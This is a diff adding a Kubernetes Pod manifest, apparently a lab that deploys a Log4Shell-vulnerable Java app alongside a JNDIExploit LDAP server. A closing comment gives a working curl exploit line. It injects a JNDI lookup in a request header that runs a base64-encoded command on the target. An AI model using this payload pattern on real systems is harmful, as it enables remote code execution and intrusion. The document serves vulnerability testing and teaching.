@@ -1,0 +1,19 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: java-app
+spec:
+  containers:
+    - name: java-app
+      image: ghcr.io/christophetd/log4shell-vulnerable-app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929
+      ports:
+        - containerPort: 8080 # The port your application listens on inside the container
+          hostPort: 8080 # The port on the host node that will be mapped to the containerPort
+    - name: ldap-app
+      image: bsalunke/jndiexploit:1.0
+      ports:
+        - containerPort: 8888 # The port your application listens on inside the container
+          hostPort: 8888 # The port on the host node that will be mapped to the containerPort
+
+
+# on host machine, run:curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
